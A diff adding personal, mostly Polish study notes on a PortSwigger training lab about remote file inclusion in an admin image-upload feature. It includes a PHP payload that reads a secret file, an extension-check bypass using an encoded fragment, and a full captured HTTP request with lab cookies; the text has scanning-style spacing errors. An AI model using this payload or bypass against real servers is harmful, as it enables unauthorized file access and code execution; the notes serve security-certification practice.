@@ -191,7 +191,67 @@ Priority: u=1, i
 A3: Przeczytać /home/carlos/secret/
 https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-rfi
 
+Admin Panel RFI
+RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, 
+the source URL must be HTTPS and the file extension is checked. Incorrect RFI result in response message, File must be either a jpg or png.
 
+1. przygotowanie pliku na exploit server + store: /shell.php + body <?php echo file_get_contents('/home/carlos/secret'); ?> 
+2. upload pliku w przegladarce /shell.php i w burp przemieniam koncowke na shell.php%23kek.jpg 
+payload jest na serwerze, widze w logach ze bot wszedl na moj endpoint i jest 200 (/shell.php)
+3. wchodzę w repeaterze na endpoint gdzieladuja sie zdjecia by odczytac secret /blogImage/shell.php
+
+
+
+POST /admincont rols/imagefile HTTP/2
+Host : Oaf7004b03469209810f4e5200da0049.web-security-academy. net
+Cookie: lab=
+46%7cMCwCFCOHp1e5%2b fnnFj5mcdEQy Cq%2f3d2xAhQhFwP7eXxQ2f5SBD5t bOl Z3xM0gPx9i7Pl uJihxqZ9wpPt iB8LSCOw7EMGdIDYL
+cLixNJGt b JFZ9Gl yWr6mt xt Z6RfviSj 5gLj f7sRAR9zUr%2f faBt KEKpCSQ5ut dI6e5y5GPOCT%2frgCAg%3d; session=
+of Mv 62EALvT61WXW2zFGQfLFFLzKKQ8t
+Content-Length: 142
+Cache-Control : max-age=0
+Sec-Ch-Ua: "Not-A. Brand" ; v="24", "Chromium" ; v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Plat form: "Linux"
+Accept -Language: en-US, en ; q=0.9
+Origin: https://Oaf7004b03469209810f4e5200da0049.web-security-academy.net
+Content -Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0
+Safari/537.36
+Accept :
+text/html,application/xhtml+xml, application/xml; q=0.9,image/avif, image/webp,image/apng, */ *; q=0.8, applicati
+on/signed-exchange; v=b3; q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User : ?1
+Sec-Fetch-Dest : document
+Referer: https://Oaf7004b03469209810f4e5200da0049.web-security-academy . net/admincontrols
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=qNXiL7l JGzDmIpTxsmZOYanjpsot 4JJb&ImageUrl=
+https%3A%2F%2Fexploit-Oa02007d033192c181864dfd017c00e7.exploit-server.net%2Fshell.php%23kek.jpg
+
+
+
+EXPLOIT SERVER - STORE!
+
+pytanie, jaki endpoint Exploit server:
+https://exploit-server.com/shell.php dawał 200 w logach.
+https://exploit-server.com/shell.php#kek.jpg dawał 400 w logach
+
+body:
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+przegladarka:
+pytanie jaki link na stronie zuploadowany, chyba ten z 200. gdy ofiara go zobaczyla, przychodzil jej secret na endpoint /blogImage/shell.php
+https://exploit-server.com/shell.php dawał 200 w logach.
+https://exploit-server.com/shell.php#kek.jpg dawał 400 w logach
+
+Na ten endpoint przychodzi secret carlosa:
+GET /blogImage/shell.php
+https://github.com/user-attachments/assets/da5b67c8-aac6-44ca-8f20-fb0287aa69e8
 
 
 
